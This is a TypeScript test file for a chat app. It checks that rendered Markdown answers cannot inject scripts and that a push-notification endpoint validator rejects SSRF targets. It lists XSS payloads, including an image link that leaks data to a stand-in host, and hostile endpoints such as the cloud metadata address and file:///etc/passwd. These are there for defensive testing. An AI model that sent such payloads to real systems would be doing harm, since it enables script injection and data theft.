/**
 * Script injection in rendered answers (169). Model output is untrusted text: the
 * Markdown renderer the chat uses must never produce a script, an event handler,
 * a `javascript:` link or a fetched image. Runs the real renderer; no browser.
 */
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { createElement, Fragment } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "react-markdown";

const chat = readFileSync(
  new URL("../../src/components/chat/MessageList.tsx", import.meta.url),
  "utf8",
);

// The chat's own configuration: images become their words.
const render = (text: string) =>
  renderToStaticMarkup(
    createElement(Markdown, {
      components: { img: ({ alt }: { alt?: string }) => createElement(Fragment, null, alt ?? "") },
      children: text,
    }),
  );

test("the chat renders Markdown with images as words and no HTML plugin", () => {
  assert.match(chat, /<Markdown components=\{\{ pre: CodeBlock, img: ImageAsWords \}\}>/);
  assert.doesNotMatch(chat, /rehype-raw|rehypeRaw|allowDangerousHtml|skipHtml=\{false\}/);
});

test("hostile answers render as inert text", () => {
  const attacks = [
    "<script>alert(1)</script>",
    '<img src=x onerror="alert(1)">',
    "[click](javascript:alert(1))",
    "[click](JaVaScRiPt:alert(1))",
    "[click](vbscript:msgbox(1))",
    "[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "![x](https://elsewhere.example/?d=secret)",
    '<a href="javascript:alert(1)">x</a>',
    "<svg onload=alert(1)>",
    '<iframe src="https://elsewhere.example"></iframe>',
  ];
  for (const attack of attacks) {
    const html = render(attack);
    assert.doesNotMatch(html, /<script|<iframe|<svg|<img/i, `${attack} -> ${html}`);
    assert.doesNotMatch(html, /<[^>]*\son\w+=/i, `${attack} -> ${html}`);
    assert.doesNotMatch(html, /href="(?:javascript|vbscript|data):/i, `${attack} -> ${html}`);
    assert.doesNotMatch(html, /elsewhere\.example\/\?d=/, `${attack} fetched nothing -> ${html}`);
  }
  assert.match(
    render("[ok](https://example.test/a)"),
    /href="https:\/\/example\.test\/a"/,
    "real links still work",
  );
});

test("the server posts push messages only to the browsers' push services (SSRF)", async () => {
  const { isPushService } = await import("../../src/lib/notifications/web-push.ts");
  for (const endpoint of [
    "https://169.254.169.254/latest/meta-data/",
    "https://127.0.0.1/push",
    "http://fcm.googleapis.com/fcm/send/x",
    "https://fcm.googleapis.com.attacker.example/x",
    "https://attacker.example/?u=https://fcm.googleapis.com",
    "https://evil.example\\@fcm.googleapis.com/x",
    "file:///etc/passwd",
    "not a url",
  ]) {
    assert.equal(isPushService(endpoint), false, endpoint);
  }
  assert.equal(isPushService("https://fcm.googleapis.com/fcm/send/abc"), true);
  assert.equal(isPushService("https://wns2-db5p.notify.windows.com/w/?token=x"), true);
});
